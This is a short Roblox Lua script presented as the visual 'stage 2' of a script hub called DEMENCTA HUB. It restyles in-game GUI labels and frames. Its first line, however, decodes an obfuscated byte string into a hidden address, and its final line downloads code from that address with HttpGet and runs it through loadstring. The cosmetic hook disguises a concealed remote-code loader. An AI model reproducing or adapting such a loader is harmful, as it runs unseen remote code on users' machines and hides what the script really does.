
--[[ STAGE 2: VISUAL CORE ]]
local zgZWugXy114VsoAY3KXneQ="\238\232\247\187\175\189\197\198\208\041\220\217\064\064\064\055\066\078\104\106\015\039\033\051\046\119\148\143\138\181\172\157\166\176\182\180\212\214\142\226\204\225\234\227\238\011\012\012\011\019\026\021\052\230\045\048\062\064\004\077\083\092\084\094\108\108\105\127\064\145\128\147\158\160\174\172\182\183\188\195\136\208\212\222\161\225\237\252\243\255\004\014\005\032\016\028\045\040\051\053\062\078\013\074\094\083\036\042\029\106\115\125\131\141"local T6O0Wh822wyeiKXw8iRJ=59 local pSSgCcbUYlMO=130 local zaIEEMdkN671bJ0lkpns5=0 local Yr4BiHL7ELkDbBPYA7BH=6 local TL8nzU_vOWXA=12 local a1Z5WXe2epBiC=true local t2i10ykuTeXHr=bit32 and bit32.bxor if not t2i10ykuTeXHr then t2i10ykuTeXHr=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local W_3P2iKLRQ48QuRQ_={}for pcBtBuflLPbWZhq=1,#zgZWugXy114VsoAY3KXneQ do local HvBe3F69Gn7vK=string.byte(zgZWugXy114VsoAY3KXneQ,pcBtBuflLPbWZhq)local dH7Z3TV1k72mt3QGExCSZF=(pSSgCcbUYlMO+(pcBtBuflLPbWZhq*Yr4BiHL7ELkDbBPYA7BH)+TL8nzU_vOWXA)%256 if zaIEEMdkN671bJ0lkpns5==0 then HvBe3F69Gn7vK=(HvBe3F69Gn7vK-dH7Z3TV1k72mt3QGExCSZF)%256 W_3P2iKLRQ48QuRQ_[pcBtBuflLPbWZhq]=string.char(t2i10ykuTeXHr(HvBe3F69Gn7vK,T6O0Wh822wyeiKXw8iRJ))else HvBe3F69Gn7vK=t2i10ykuTeXHr(HvBe3F69Gn7vK,T6O0Wh822wyeiKXw8iRJ)W_3P2iKLRQ48QuRQ_[pcBtBuflLPbWZhq]=string.char((HvBe3F69Gn7vK-dH7Z3TV1k72mt3QGExCSZF)%256)end end local CflR7UMA89rgAOQj=table.concat(W_3P2iKLRQ48QuRQ_)if a1Z5WXe2epBiC then CflR7UMA89rgAOQj=string.reverse(CflR7UMA89rgAOQj)end local Gqatg2RaDmxeuTfor5F=CflR7UMA89rgAOQj
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Gqatg2RaDmxeuTfor5F))()
